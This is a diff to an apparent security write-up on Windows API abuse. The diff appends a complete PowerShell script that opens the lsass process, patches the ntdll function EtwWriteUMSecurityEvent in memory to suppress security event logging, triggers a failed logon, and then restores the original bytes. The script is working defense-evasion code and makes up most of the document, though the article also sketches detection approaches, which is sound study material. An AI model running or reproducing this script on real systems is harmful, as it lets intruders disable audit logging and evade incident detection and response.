@@ -90,6 +90,7 @@ Once the memory of the Lsass process is changed, all future processes that want 
 To do this we need a process, a memory address in the process and the number of bytes to read. Then we return the read buffer.
 
 # Detection
+
 - Static-based detection : using yara tool to detect malicious software statically and dynamically at the memory level. First, we can seek common Windows API function calls that are commonly used to product process injection (such as OpenProcess, WriteProcessMemory, VirtualAlloc, …)
 
 - Flow-based detection : understanding the preceding applied flow, identifying parameters used in each function and checking their order or flow of execution. As seen earlier, process injection happens in 2 main phases : receiving a handle to the target process and injecting the malicious payload in the targeted process. By trying to open a handle to a critical process, an antivirus can detect it based on the flow of used windows API functions. For example : the use of specific parameters such as the PROCESS_ALL_ACCESS flag in the OpenProcess function, then the use of WriteProcessMemory function.
@@ -100,3 +101,203 @@ To do this we need a process, a memory address in the process and the number of 
 
 # Conclusion
 The windows API is as powerful as it is dangerous. Its action perimeter increases the risks on assets and expands the attack surface available to attackers. Moreover, the logs are of great importance to enable incident detection and response. Which makes it a prey of choice for all attackers wishing to hide their trace, or to slow down further investigations.
+
+# Script final
+```ps
+function Invoke-BPEtwSecurityEvent {
+    <#
+    .SYNOPSIS
+    
+    Many technics or functions are directly inspired by PowerSploit offensive scripts.
+    
+    .DESCRIPTION
+    
+    Load shellcode into the lsass process in order to bypass security logs
+    
+    #>
+    
+        #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
+        function Local:Get-DelegateType
+        {
+            Param
+            (
+                [OutputType([Type])]
+    
+                [Parameter( Position = 0)]
+                [Type[]]
+                $Parameters = (New-Object Type[](0)),
+    
+                [Parameter( Position = 1 )]
+                [Type]
+                $ReturnType = [Void]
+            )
+    
+            $Domain = [AppDomain]::CurrentDomain
+            $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+            $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+            $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+            $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+            $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+            $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+    
+            Write-Output $TypeBuilder.CreateType()
+        }
+    
+        #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
+        function Local:Get-ProcAddress
+        {
+            Param
+            (
+                [OutputType([IntPtr])]
+                [Parameter( Position = 0, Mandatory = $True )]
+                [String]
+                $Module,
+                [Parameter( Position = 1, Mandatory = $True )]
+                [String]
+                $Procedure
+            )
+            # Get a reference to System.dll in the GAC
+            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+            $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+            
+            # Get a reference to the GetModuleHandle and GetProcAddress methods
+            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
+            
+            # Get a handle to the module specified
+            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+            $tmpPtr = New-Object IntPtr
+            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+    
+            # Return the address of the function
+            Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+        }
+    
+        # Open lsass process and inject the shellcode into EtwWriteUMSecurityEvent function
+        function Local:Inject-MemoryProc {
+            Param (
+                # The process to corrupt
+                [Parameter()]
+                [ValidateNotNullOrEmpty()]
+                [System.IntPtr]
+                $hProcess,
+    
+                # The address where inject the data
+                [Parameter()]
+                [ValidateNotNullOrEmpty()]
+                [System.IntPtr]
+                $lpBaseAddress,
+    
+                # The shellcode
+                [Parameter()]
+                [ValidateNotNullOrEmpty()]
+                [Byte[]]
+                $lpBuffer
+            )
+    
+            $WriteProcess = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $lpBuffer.Length,[ref] 0)
+            if($WriteProcess -eq 0){
+                Write-Output "Injection failed!"
+            } else {
+                Write-Output "Injection successful!"
+            }
+        }
+    
+        # Get the value of the memory before changing
+        function Local:Get-MemoryValue
+        {
+            Param (
+                [Parameter()]
+                [ValidateNotNullOrEmpty()]
+                [System.IntPtr]
+                $ProcessId,
+                [Parameter()]
+                [ValidateNotNullOrEmpty()]
+                [System.IntPtr]
+                $lpBaseAddress,
+                [Parameter()]
+                [ValidateNotNullOrEmpty()]
+                [Int]
+                $Size
+            )
+    
+            $lpBuffer = New-Object byte[]($Size)
+            [int32]$NumberOfBytesRead = 0
+            
+            $RetValue = $ReadProcessMemory.Invoke($ProcessId, $lpBaseAddress, $lpBuffer, $lpBuffer.Length, [ref]$NumberOfBytesRead)
+    
+            Write-Output $lpBuffer
+        }
+    
+        # Build and return the shellcode
+        function Local:Get-Shellcode 
+        {
+            $CallStub = New-Object Byte[](0)
+            $CallStub += 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 # MOV RAX, 1
+            $CallStub += 0xc3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 # RETN
+    
+            Write-Output $CallStub
+        }
+    
+        # Raise an error to verify the operation of the script
+        function Local:Trigger-Lsass
+        {
+            # Set fake credentials
+            $username = 'Administrator'
+            $password = 'F4k3P$$w0rdFr0mH4ck3r'
+    
+            $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+            $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+    
+            # Start a process with fake credentials
+            Start-Process notepad.exe -Credential $credential
+        }
+    
+        # Get lsass id
+        $ProcId = Get-Process -ProcessName lsass | Select -expand Id
+    
+        # Get OpenProcess address
+        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
+        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
+    
+        # Get WriteProcessMemory address
+        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
+        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
+    
+        # Get ReadProcessMemory address
+        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
+        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
+    
+        # Get EtwWriteUMSecurityEvent address
+        $OpenProcessAddr = Get-ProcAddress "ntdll.dll" "EtwWriteUMSecurityEvent"
+    
+        if($OpenProcessAddr -eq 0){
+            exit(1)
+        } else {
+            Write-Output "Memory addr found at : $('0x{0:x}' -f [int64]$OpenProcessAddr)"
+            $lpBaseAddress = [int64]$OpenProcessAddr
+            $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
+        }
+        
+        $lpBufferEtw = Get-MemoryValue $hProcess $lpBaseAddress 170
+        $Shellcode = Get-Shellcode 
+    
+        Write-Output "Injection of the shellcode at : $($lpBaseAddress)..."
+        Inject-MemoryProc -hProcess $hProcess -lpBaseAddress $lpBaseAddress -lpBuffer $Shellcode
+    
+        Write-Output "Trigger the Security Event ..."
+        Trigger-Lsass
+    
+        Write-Output "Rewrite the memory ..."
+        Inject-MemoryProc -hProcess $hProcess -lpBaseAddress $lpBaseAddress -lpBuffer $lpBufferEtw
+    
+        Write-Host "Press any key to continue..."
+        $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    }
+    Invoke-BPEtwSecurityEvent
+```
